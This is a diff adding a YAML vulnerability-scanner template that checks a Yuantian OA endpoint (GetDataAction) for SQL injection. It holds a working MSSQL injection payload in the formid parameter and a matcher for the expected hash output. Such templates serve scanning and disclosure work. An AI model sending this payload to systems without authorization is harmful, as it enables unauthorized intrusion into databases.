@@ -1,0 +1,29 @@
+id: yuantianoa-GetDataAction-sqli
+info:
+  name: yuantianoa-GetDataAction-sqli
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://mp.weixin.qq.com/s/FgyvNdmAIF1KRR8FVyQMew
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /ServiceAction/ServiceAction/com.velcro.base.GetDataAction?action=checkname&formid=-1%27%20OR%207063%20IN%20(SELECT%20(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20AND%20%27a%27=%27a HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        sec-ch-ua-platform: "Windows"
+        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
+        sec-ch-ua-mobile: ?0
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '23820dcc509a6f75849b'
